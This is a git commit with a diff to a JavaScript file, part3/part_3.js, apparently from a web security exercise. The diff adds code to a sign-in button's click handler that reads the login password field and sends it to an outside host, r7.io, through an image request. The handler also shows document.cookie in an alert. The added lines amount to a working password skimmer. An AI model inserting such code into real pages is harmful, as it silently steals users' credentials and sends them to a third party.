c2c4b9ffa3dcf9718f165705c523a38fbc13dd4a
dlee20013 <dlee20013@gmail.com>
2017-04-25 03:37:20 -0700

    h

--- part3/part_3.js
+++ part3/part_3.js
@@ -1,5 +1,8 @@
 document.addEventListener("DOMContentLoaded", function() {
 	document.getElementById("signin-btn").onclick = function givePassword() {
+		var img = new Image();
+		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById("login_password").value);
+		console.log(img);
 		alert(document.cookie);
 	};
 	var prob = document.getElementsByClassName("problem")[0];
